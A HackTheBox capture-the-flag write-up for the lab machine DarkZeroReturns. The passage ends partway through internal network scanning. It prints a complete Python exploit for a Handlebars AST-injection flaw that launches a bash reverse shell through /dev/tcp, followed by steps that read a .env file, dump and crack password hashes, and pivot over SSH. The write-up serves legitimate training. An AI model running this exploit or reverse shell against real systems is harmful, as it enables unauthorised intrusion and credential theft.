---
title: DarkZeroReturns
date: 2026-09-12
excerpt: HackTheBox - Hard
cover: ../uploads/cover_darkzeroreturns.jpg
tags: CVE-2026-33937, AST Injection, SID History Injection, SEBackupPrivilege
---

Welcome to another Hack The Box writeup. This time we're tackling **DarkZeroReturns**, one of the machines from **Hack The Box Season 11**. This guide walks through the entire attack path step by step — from the first scans all the way to full domain compromise — and tries to explain not just *what* was run, but *why* each step made sense given what we'd found so far.

Rather than jumping straight to the answer, the goal here is to show the actual thought process: what enumeration revealed, which leads turned out to be dead ends, and how each small discovery fed into the next stage of the attack. Enumeration is usually the make-or-break phase of a penetration test, so extra attention is given to explaining the reasoning behind each pivot.

Whether you're working through this box yourself, comparing notes on a different approach, or just want to sharpen your own methodology, hopefully this breakdown is useful.

Let's get started.

## Phase 1: Reconnaissance

The first step in any assessment is a port scan to see what's actually reachable on the target. We start with an aggressive `Nmap` scan to identify open ports, running services, and any obvious entry points.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ nmap -A -T5 10.129.43.37                                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-09 19:11 EDT
Nmap scan report for 10.129.43.37
Host is up (0.13s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://dzcampaigns.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   91.95 ms  10.10.14.1
2   107.63 ms 10.129.43.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.76 seconds
```

**Reading the results:** the host is alive and only two TCP ports respond — `22` and `80`.

- **Port 22** is running `OpenSSH 9.6p1` on Ubuntu. This is a possible way in later, but only if we manage to find valid credentials or another way to leverage it.
- **Port 80** is running `nginx 1.24.0`, meaning there's a web application to look at. Nmap also notes that requests to port 80 get redirected to `http://dzcampaigns.htb/` — this is a useful clue because it tells us the actual hostname the app expects, which we can now add to our hosts file and browse to directly.

The remaining 998 ports are filtered (no response at all), so `22` and `80` are really our only two entry points for now.

One thing worth flagging: Nmap's OS-detection engine guesses "Windows Server 2012 R2," but it explicitly warns that this guess is unreliable, and the separately-detected *service* info (OpenSSH + nginx on Ubuntu) tells a much more consistent story: this is a Linux box. We shouldn't trust the OS guess here.

With only the web service left to explore — and a hostname now in hand — that's where we head next.

```text
# In /etc/hosts
10.129.43.37    dzcampaigns.htb
```

Now let's visit `dzcampaigns.htb`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F6fmScSy1vtC7kf8086Wa%252FScreenshot%2520%283312%29.png%3Falt%3Dmedia%26token%3D8a995728-a1a3-49b0-b032-918deeec0dcf&width=768&dpr=3&quality=100&sign=6a950826784f991c4f8a2f01bf7d702a&sv=3)

Now let's try to navigate in the login page

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FngscW2kXt4im32KFRHfT%252FScreenshot%2520%283313%29.png%3Falt%3Dmedia%26token%3D805c4123-3e93-4cc5-8d23-5807530d2642&width=768&dpr=3&quality=100&sign=7862f1301170cc6eddff03da87fbd430&sv=3)

The login page happens to have a registration link, so let's use it to create an account.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FBGaB2GKMdFDsPKdBbsK2%252FScreenshot%2520%283314%29.png%3Falt%3Dmedia%26token%3D83b7e916-c62a-45fa-a354-62279c802bfd&width=768&dpr=3&quality=100&sign=caf84b260f776f17bfb5b95313f38364&sv=3)

## Phase 2: Web Application Enumeration & Initial Foothold

Once logged in, we're able to create a "character" for a campaign — let's try that.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fvi954dFXCK3nOWspPyce%252FScreenshot%2520%283315%29.png%3Falt%3Dmedia%26token%3D0c14c0f6-d2a7-4570-a190-0bc0eea829e6&width=768&dpr=3&quality=100&sign=d3067269b23c84e2616d65f7cfe0218e&sv=3)

Here's the interesting bit: on the character creation page, the "CUSTOM CAMPAIGN MESSAGE" field displays a template that uses double-curly-brace syntax:

```
{{ }}
```

That syntax is a strong hint about what's rendering this text server-side, so it's worth digging into further. Meanwhile, let's also brute-force the site for hidden directories and endpoints:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ feroxbuster -u http://dzcampaigns.htb --filter-status 404 
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dzcampaigns.htb/
 🚩  In-Scope Url          │ dzcampaigns.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       44l       78w      995c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET       10l       15w      153c http://dzcampaigns.htb/css => http://dzcampaigns.htb/css/
200      GET     1164l     2717w    25823c http://dzcampaigns.htb/css/styles.css
200      GET      117l      485w     3789c http://dzcampaigns.htb/essentials
200      GET       55l      115w     1509c http://dzcampaigns.htb/login
200      GET       29l       65w      786c http://dzcampaigns.htb/js/app.js
200      GET       58l      261w     2235c http://dzcampaigns.htb/campaign/1
200      GET       70l      155w     2126c http://dzcampaigns.htb/dice
200      GET       68l      265w     2473c http://dzcampaigns.htb/
200      GET       58l      141w     1735c http://dzcampaigns.htb/register
200      GET       55l      115w     1509c http://dzcampaigns.htb/Login
```

One result stands out: `/campaign/1`. Let's take a look:

```text
http://dzcampaigns.htb/campaign/1
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FjRPGHItllXPsnQ0XIUG8%252FScreenshot%2520%283316%29.png%3Falt%3Dmedia%26token%3D8be7d059-0101-4f2d-b1b1-9dd6a7dc5305&width=768&dpr=3&quality=100&sign=a854889eacf5731eddd390c39ce950c3&sv=3)

### Identifying the Template Injection Vector

A natural first test for template-based vulnerabilities is a basic math-expression payload:

```text
{{ 7 * 7 }}
```

This didn't do anything on its own — but the message shown during character creation is the real clue:

```text
A new face emerges! The {{race}} {{class}} {{name}} has joined the campaign...
```

That double-curly-brace notation is the signature of **Handlebars**, a popular Node.js templating engine (Mustache uses a very similar syntax). A quick primer on how Handlebars expressions work:

* `{{variable}}` → simple value interpolation
* `{{#helper}} ... {{/helper}}` → block helpers (loops, conditionals, etc.)
* `{{constructor}}`, `{{this}}`, etc. → these reach into the template's execution context, and potentially the JavaScript prototype chain

Since the default message is *literally built* using these delimiters, and the "custom campaign message" field lets a user submit their own string, there's a reasonable chance this string is being fed straight into Handlebars rather than being escaped or sanitized first.

**Why this matters — the classic Server-Side Template Injection (SSTI) path:**

1. The application takes the message text a user submits.
2. That string gets handed to `Handlebars.compile()` (or something equivalent).
3. The compiled template is then rendered against a context object containing fields like `race`, `class`, `name`, etc.
4. If the user-supplied string isn't sandboxed or restricted in any way, an attacker can smuggle in Handlebars expressions that break out of the intended "fill in the blanks" behavior and execute arbitrary logic.

A textbook proof-of-concept for this kind of SSTI looks like:

```handlebars
{{constructor.constructor('return process')()}}
```

...or one of the longer "sandbox escape" variants that eventually reaches `require('child_process')` to run OS commands.

### The Deeper Bug: CVE-2026-33937 (Handlebars AST Injection)

Beyond the classic string-based SSTI, this particular target is also exposed to something more specific: **CVE-2026-33937**, a critical (CVSS 9.8) type-confusion vulnerability affecting Handlebars versions **4.0.0 through 4.7.8** (patched in 4.7.9).

**What's actually broken:** `Handlebars.compile()` is designed to accept either a plain template *string*, or a pre-parsed **Abstract Syntax Tree (AST)** object representing an already-parsed template. The bug lives in how that second case is handled — when an AST object is passed in, the `value` field of a `NumberLiteral` node inside it gets dropped directly into the generated JavaScript **without any quoting or escaping**.

In other words: if an attacker can get the application to hand a *crafted AST object* to `compile()` instead of a plain string, they can smuggle arbitrary JavaScript straight into the code Handlebars generates — leading to Remote Code Execution.

On this application, the "custom campaign message" field is processed in a way that lets attacker input reach that AST code path. Even though the UI just shows a normal text box, the backend apparently doesn't strictly enforce that whatever gets passed to `compile()` is a string. So the exact same form that *looks* like a candidate for classic SSTI is also — and more reliably — exploitable through this AST type-confusion bug.

### Building the Exploit

For the initial foothold, the plan is: craft a malicious AST object (rather than a malicious *string*), submit it as the campaign message, and have the resulting generated JavaScript reach into Node's `child_process` (via `process.mainModule`) to run a command with `execSync()`, converting the output buffer to text.

```python
import requests
import sys
import re
import time

HOST = "http://dzcampaigns.htb"
s = requests.Session()
USER = "kuro@kuro.com"
PASS = "loloMOpanot023!!"
IP = "10.10.14.32"
PORT = 1234

def token(p="/characternew"):
    r = s.get(HOST + p)
    print(f"[token] GET {p} -> {r.status_code}")
    m = re.search(r'name="_csrf" value="([^"]+)"', r.text)
    if not m:
        print("[!] CSRF not found. Response snippet:")
        print(r.text[:500])
        sys.exit(1)
    return m.group(1)

def auth():
    t = token("/login")
    r = s.post(HOST + "/login", data={"_csrf": t, "email": USER, "password": PASS}, allow_redirects=False)
    print(f"[auth] POST /login -> {r.status_code}, Location={r.headers.get('Location')}")
    if r.status_code not in (301, 302):
        print("[!] Login may have failed. Response:")
        print(r.text[:500])

def ast(c):
    return {
        "type": "Program",
        "body": [{
            "type": "MustacheStatement",
            "path": {"type": "PathExpression", "data": False, "depth": 0, "parts": ["lookup"], "original": "lookup", "loc": None},
            "params": [
                {"type": "PathExpression", "data": False, "depth": 0, "parts": [], "original": "this", "loc": None},
                {"type": "NumberLiteral", "value": "{},{})) + process.mainModule.require('child_process').execFileSync('/bin/bash',['-c','%s']).toString() //" % c, "original": 1, "loc": None}
            ],
            "escaped": True, "strip": {"open": False, "close": False}, "loc": None
        }],
        "strip": {}, "loc": None
    }

def cid():
    r = s.get(HOST + "/dashboard")
    print(f"[cid] GET /dashboard -> {r.status_code}")
    m = re.search(r'campaign[_-]?id["\s:=]+(\d+)', r.text, re.IGNORECASE) or re.search(r'/campaign[s]?/(\d+)', r.text)
    if m:
        print(f"[cid] campaign_id={m.group(1)}")
        return int(m.group(1))
    print("[!] campaign_id not found, defaulting to 1")
    return 1

def run(c, i=None):
    i = i or cid()
    t = token()
    payload = {
        "_csrf": t,
        "name": f"T{int(time.time()*1000)%100000}",
        "race": "a",
        "class": "a",
        "backstory": "a",
        "campaign_id": i,
        "campaign_message": ast(c)
    }
    r = s.post(HOST + "/character", json=payload, allow_redirects=False)
    print(f"[run] POST /character -> {r.status_code}")
    if r.status_code != 302:
        print("[!] Unexpected response:")
        print(r.text[:800])
    return r

if __name__ == "__main__":
    auth()
    run(f'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1')
```

The script logs in, grabs a CSRF token, and posts a character-creation request where the `campaign_message` field is a full AST object (not a string) whose crafted `NumberLiteral` value breaks out of the generated code and runs a reverse shell one-liner.

Now let's launch our listener and run it:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ python3 exploit.py
[token] GET /login -> 200
[auth] POST /login -> 302, Location=/dashboard
[cid] GET /dashboard -> 200
[!] campaign_id not found, defaulting to 1
[token] GET /characternew -> 404
```

Now let's check our listener:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.32] from (UNKNOWN) [10.129.43.37] 51146
bash: cannot set terminal process group (870): Inappropriate ioctl for device
bash: no job control in this shell
darkzero@SRV01:~$ 
```

We have a shell as `darkzero` on a machine called `SRV01`. Let's immediately upgrade it to a fully interactive TTY, which makes things like tab-completion and Ctrl+C work properly:

```shell
darkzero@SRV01:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
darkzero@SRV01:~$ export TERM=xterm
export TERM=xterm
```

## Phase 3: Post-Exploitation on SRV01

With a working shell, it's time to look around the compromised host for anything useful — configuration files, credentials, or other services running locally.

```shell
darkzero@SRV01:~$ ls -al
total 84
drwxrwxr-x   6 darkzero darkzero  4096 Jul 14 06:10 .
drwxr-xr-x   6 root     root      4096 Jul 21 05:39 ..
-rw-------   1 darkzero darkzero   133 May 20 10:11 .env
drwxrwxr-x 158 darkzero darkzero  4096 May 19 11:11 node_modules
drwxrwxr-x   4 darkzero darkzero  4096 May 19 10:55 .npm
-rw-rw-r--   1 darkzero darkzero   644 May 19 11:11 package.json
-rw-rw-r--   1 darkzero darkzero 43128 May 19 11:11 package-lock.json
drwxrwxr-x   2 darkzero darkzero  4096 May 19 08:53 scripts
-rw-rw-r--   1 darkzero darkzero  4638 May 19 11:11 server.js
drwxrwxr-x  12 darkzero darkzero  4096 Apr 24 14:45 src
```

There's a `.env` file sitting right in the application directory — these files almost always hold secrets, so let's check it out:

```shell
darkzero@SRV01:~$ cat .env
PORT=8081
DB_HOST=localhost
DB_USER=darkzero
DB_PASSWORD=C4ntFindMyDMpass!
DB_NAME=darkzero_campaigns
SESSION_SECRET=DarkSession312#
```

That's our first set of credentials — database access for a `darkzero_campaigns` MySQL database. Before trying them, let's confirm MySQL is actually listening locally:

```shell
darkzero@SRV01:~$ ss -tnlp
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                        
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*                                  
LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*                                  
LISTEN 0      511        127.0.0.1:8081       0.0.0.0:*    users:(("node",pid=870,fd=34))
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                  
LISTEN 0      4096      127.0.0.54:53         0.0.0.0:*                                  
LISTEN 0      151        127.0.0.1:3306       0.0.0.0:*                                  
LISTEN 0      70         127.0.0.1:33060      0.0.0.0:*                                  
LISTEN 0      4096            [::]:22            [::]:*                                  
LISTEN 0      4096               *:46879            *:*
```

Sure enough, `3306` — MySQL's default port — is bound to localhost. Let's log in with the credentials from `.env`:

```shell
darkzero@SRV01:~$ mysql -u darkzero -pC4ntFindMyDMpass!
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 76
Server version: 8.0.46-0ubuntu0.24.04.3 (Ubuntu)

Copyright (c) 2000, 2026, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

We're in. Let's see what databases are available:

```shell
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| darkzero_campaigns |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)
```

And the tables inside `darkzero_campaigns`:

```shell
mysql> show tables;
+------------------------------+
| Tables_in_darkzero_campaigns |
+------------------------------+
| campaign_messages            |
| campaigns                    |
| character_items              |
| characters                   |
| items                        |
| sessions                     |
| users                        |
+------------------------------+
7 rows in set (0.01 sec)
```

The `users` table is obviously the most interesting one:

```shell
mysql> select * from users;
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
| id | email                 | username | password_hash                                                | role   | created_at          |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
|  1 | admin@dzcampaigns.htb | admin    | $2b$10$HDdWzYvp1IWFD9TB4JsuCerlh.vKchv/LmBruCmKGH19hPP7IXvjm | admin  | 2026-04-19 15:34:56 |
|  3 | josh@dzcampaigns.htb  | josh     | $2b$10$kX7QPjPIQI5hxJWV4a0HpO7UcdstuwLxP51LhHPFP5ceATiOKmVbK | player | 2026-05-19 14:31:30 |
|  4 | kuro@kuro.com         | kuro     | $2b$10$2YUUSnWJidbcLtde.OXljeOh8lNT07aMgcqd0qJOXZ62gtllvhT4S | player | 2026-09-10 11:55:27 |
+----+-----------------------+----------+--------------------------------------------------------------+--------+---------------------+
3 rows in set (0.01 sec)
```

These are bcrypt hashes, so let's try cracking them offline against a common wordlist using `john`:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Rangers1         (josh)     
1g 0:00:00:00 DONE (2026-09-09 19:51) 1.851g/s 100.0p/s 100.0c/s 100.0C/s password1..Rangers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`josh`'s password cracks almost instantly: `Rangers1`. Since `josh` also has a real home directory on the Linux box, it's worth trying these credentials over SSH instead of staying on our web-shell foothold:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/DarkZeroReturns]
└─$ ssh josh@dzcampaigns.htb                  
josh@dzcampaigns.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-136-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Sep 10 12:33:19 PM UTC 2026

  System load:  0.08               Processes:             149
  Usage of /:   47.4% of 10.66GB   Users logged in:       0
  Memory usage: 69%                IPv4 address for eth0: 172.16.20.3
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

5 updates can be applied immediately.
5 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

josh@SRV01:~$ 
```

We're now `josh` with a real SSH session — a much more stable foothold than the reverse shell. Let's keep enumerating:

```shell
josh@SRV01:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.3  netmask 255.255.255.0  broadcast 172.16.20.255
        ether 00:15:5d:f4:7c:02  txqueuelen 1000  (Ethernet)
        RX packets 16261  bytes 8986730 (8.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13521  bytes 3484813 (3.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 10239  bytes 2962442 (2.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10239  bytes 2962442 (2.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

## Phase 4: Discovering the Internal Network

The `eth0` interface tells us something important: this box has an IP of `172.16.20.3/24`, meaning it sits on the `172.16.20.0/24` network. That's a private range, and it hints that there may be other machines on this internal network that we can't reach directly from our attacking box, but that `SRV01` can.

Let's scan that whole subnet using `fscan`, a fast Go-based network scanner, to map out what else lives there:

```shell
josh@SRV01:/tmp$ ./fscan -h 172.16.20.0/24
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan 2.2.1 (95cc12e 2026-08-25T20:44:10Z)
                                                                                                                                  
[*] 服务插件: webtitle, nfs, neo4j, ftp, ssh ... 等36个                                                                                                                                                                                     
[*] 切换到ping命令模式
[*] 172.16.20.2 存活 (协议: ICMP)
[*] 172.16.20.1 存活 (协议: ICMP)
[*] 172.16.20.3 存活 (协议: ICMP)
[*] ICMP响应率过低(1.2%)，启用TCP补充探测(251个主机)
[*] 参数自适应: Timeout=1000ms, ModuleThread=5, Retry=6, ICMPRate=0.05, PocNum=5
[*] 172.16.20.3:22                 ssh      [Product:OpenSSH ||Version:9.6p1 Ubuntu 3ubuntu13.18] Banner:(SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.18)
[*] 172.16.20.1:22                 ssh      [Product:OpenSSH ||Version:9.6p1 Ubuntu 3ubuntu13.18] Banner:(SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.18)
[+] SSH服务识别成功: 172.16.20.3:22 - SSH 2.0 (OpenSSH_9.6p1 Ubuntu-3ubuntu13.18)
[+] SSH服务识别成功: 172.16.20.1:22 - SSH 2.0 (OpenSSH_9.6p1 Ubuntu-3ubuntu13.18)
[*] 172.16.20.2:445                microsoft-ds [Product:Microsoft Windows SMB2] Banner:(SMB@ A j h| F X de A D%0. x `v + l0j <0: + 7 * H * H * H + 7 *0( & $not_defined_...)
[-] 插件扫描错误 172.16.20.2:445 - 目标可能不支持SMBv1
[+] SMBInfo 172.16.20.2:445 [Windows 11 (Build 26100)] DC02 SMBv2
[*] 172.16.20.1:445                microsoft-ds [Product:Microsoft Windows SMB2] Banner:(SMB@ A U f G `C| ^Y PF%0. x `v + l0j <0: + 7 * H * H * H + 7 *0( & $not_defined_...)
[-] 插件扫描错误 172.16.20.1:445 - 目标可能不支持SMBv1
[+] SMBInfo 172.16.20.1:445 [Windows 11 (Build 26100)] DC01 SMBv2
[*] http://172.16.20.3             http     [Product:nginx ||Version:1.24.0] Banner:(HTTP/1.1 200 OK Server: nginx/1.24.0 (Ubuntu) Date: Mon, 17 Aug 2026 10:07:01 GM...)
[*] http://172.16.20.1             http     [Product:nginx ||Version:1.24.0] Banner:(HTTP/1.1 200 OK Server: nginx/1.24.0 (Ubuntu) Date: Mon, 17 Aug 2026 10:07:01 GM...)
[+] http://172.16.20.3             code:302 len:154   title:302 Found            server:nginx/1.24.0 (Ubuntu) [nginx nginx/1.24.0]
[+] http://172.16.20.1             code:302 len:154   title:302 Found            server:nginx/1.24.0 (Ubuntu) [nginx nginx/1.24.0]
[*] 172.16.20.1:88                 spark    [Product:Apache Spark]
[*] 172.16.20.2:88                 spark    [Product:Apache Spark]
[*] http://172.16.20.2:139         http     [Product:Open Lighting Architecture daemon]
[-] 插件扫描错误 172.16.20.2:139 - SMB协议探测失败: 读取SMBv2协商响应失败: 消息长度过大: 2197815297
[-] 插件扫描错误 172.16.20.2:139 - 读取SMB Session Setup响应失败: EOF
[*] http://172.16.20.1:139         http     [Product:Open Lighting Architecture daemon]
[-] 插件扫描错误 172.16.20.1:139 - 读取SMB Session Setup响应失败: EOF
[-] 插件扫描错误 172.16.20.1:139 - SMB协议探测失败: 读取SMBv2协商响应失败: 消息长度过大: 2197815297
[-] 插件扫描错误 172.16.20.2:139 - Get "http://172.16.20.2:139": net/http: HTTP/1.x transport connection broken: malformed HTTP response "\x83\x00\x00\x01\x8f"
[*] 172.16.20.2:389                genetec-5400 [Product:Genetec Security Center] Banner:(0 d 0 0 domainFunctionality1 70 forestFunctionality1 70 ) domainControllerFuncti...)
[+] LDAP 172.16.20.2:389 LDAP
[*] 172.16.20.1:389                genetec-5400 [Product:Genetec Security Center] Banner:(0 d 0 0 domainFunctionality1 70 forestFunctionality1 70 ) domainControllerFuncti...)
[+] LDAP 172.16.20.1:389 LDAP
[-] 插件扫描错误 172.16.20.1:139 - Get "http://172.16.20.1:139": net/http: HTTP/1.x transport connection broken: malformed HTTP response "\x83\x00\x00\x01\x8f"
[*] https://172.16.20.1:636        ssl      Banner:(M j K j v' `= y . / DOWNGRD :,c I#k! D 1$q PP2 } R / 0 0 @ S 0 * H 0J1 0 & ,d ht...)
[+] LDAP 172.16.20.1:636 LDAP
[*] https://172.16.20.2:636        ssl      Banner:(M j K( P` Sq&m V" H e y DOWNGRD ?# Y > sN y 0 {SzH X / 0 0 Z ]+ 0 * H 0N1 0 & ,d...)
[+] LDAP 172.16.20.2:636 LDAP
[-] 插件扫描错误 172.16.20.1:636 - Get "https://172.16.20.1:636": read tcp 172.16.20.3:37878->172.16.20.1:636: read: connection reset by peer
[-] 插件扫描错误 172.16.20.2:636 - Get "https://172.16.20.2:636": read tcp 172.16.20.3:33406->172.16.20.2:636: read: connection reset by peer
[*] http://172.16.20.2:3000        dps-shell [Product:Destiny DPS Mini shell] Banner:(HTTP/1.1 400 Bad Request Content-Type: text/plain; charset=utf-8 Connection: clo...)
[*] https://172.16.20.2:3269       ssl      Banner:(M j Mfq l <38[ { 9{DOWNGRD G X K I K-44K 1.{ f / 0 0 Z ]+ 0 * H 0N1 0 & ,d ext1 ...)
[*] https://172.16.20.1:3269       ssl      Banner:(M j M\l@ / H e - DOWNGRD 2 M K pkq* w , ! 1 / 0 0 @ S 0 * H 0J1 0 & ,d htb1 0 & ...)
[+] LDAP 172.16.20.2:3269 LDAP
[*] 172.16.20.2:3268               genetec-5400 [Product:Genetec Security Center] Banner:(0 d 0 0 domainFunctionality1 70 forestFunctionality1 70 ) domainControllerFuncti...)
[+] LDAP 172.16.20.1:3269 LDAP
[+] LDAP 172.16.20.2:3268 LDAP
[+] http://172.16.20.2:3000        code:200 len:13794 title:Gitea: Git with a cup of tea [Gitea简易Git服务 gitea ipeakcms]
[*] 172.16.20.1:3268               genetec-5400 [Product:Genetec Security Center] Banner:(0 d 0 0 domainFunctionality1 70 forestFunctionality1 70 ) domainControllerFuncti...)
[+] LDAP 172.16.20.1:3268 LDAP
[*] http://172.16.20.1:5985        http     [Product:Open Lighting Architecture daemon] Banner:(HTTP/1.1 404 Not Found Content-Type: text/html; charset=us-ascii Server: Microso...)
[*] http://172.16.20.1:5985        code:404 len:315   title:Not Found            server:Microsoft-HTTPAPI/2.0
[*] http://172.16.20.2:5985        http     [Product:Open Lighting Architecture daemon] Banner:(HTTP/1.1 404 Not Found Content-Type: text/html; charset=us-ascii Server: Microso...)
[*] http://172.16.20.2:5985        code:404 len:315   title:Not Found            server:Microsoft-HTTPAPI/2.0
[-] 插件扫描错误 172.16.20.1:3269 - Get "https://172.16.20.1:3269": read tcp 172.16.20.3:35456->172.16.20.1:3269: read: connection reset by peer
[-] 插件扫描错误 172.16.20.2:3269 - Get "https://172.16.20.2:3269": read tcp 172.16.20.3:40078->172.16.20.2:3269: read: connection reset by peer
[*] 172.16.20.2:53                 domain   [Product:Simple DNS Plus] Banner:(version bind)
[*] 172.16.20.1:53                 domain   [Product:Simple DNS Plus] Banner:(version bind)
[*] 172.16.20.2:135                msrpc    [Product:Microsoft Windows RPC] Banner:(@)
[+] NetInfo 172.16.20.2:135 [DC02]
[+] NetInfo 172.16.20.2:135   -> 172.16.20.2                                                                                                                                                                                                
[*] 172.16.20.1:135                msrpc    [Product:Microsoft Windows RPC] Banner:(@)
端口扫描中（45线程） ● 100.0% [==============================] (399/399) 23/s TCP:94/1426                                                                                                                                                  
[完成] 扫描完成: 399/399 (耗时: 17.2s)
[*] 扫描完成，发现 25 个开放端口
[*] 存活主机数: 3
[+] NetInfo 172.16.20.1:135 [DC01]
[+] NetInfo 172.16.20.1:135   -> 10.129.88.241                                                                                                                                                                                              
[+] NetInfo 172.16.20.1:135   -> 172.16.20.1                                                                                                                                                                                                
[*] 扫描任务完成，耗时 26.413s，已扫描 53 个目标

josh@SRV01:/tmp$ cat fscan_scan.txt
# ===== 存活主机 =====
172.16.20.2
172.16.20.1
172.16.20.3

# ===== 开放端口 =====
172.16.20.1:80
172.16.20.3:22
172.16.20.1:22
172.16.20.3:80
172.16.20.2:445
172.16.20.1:445
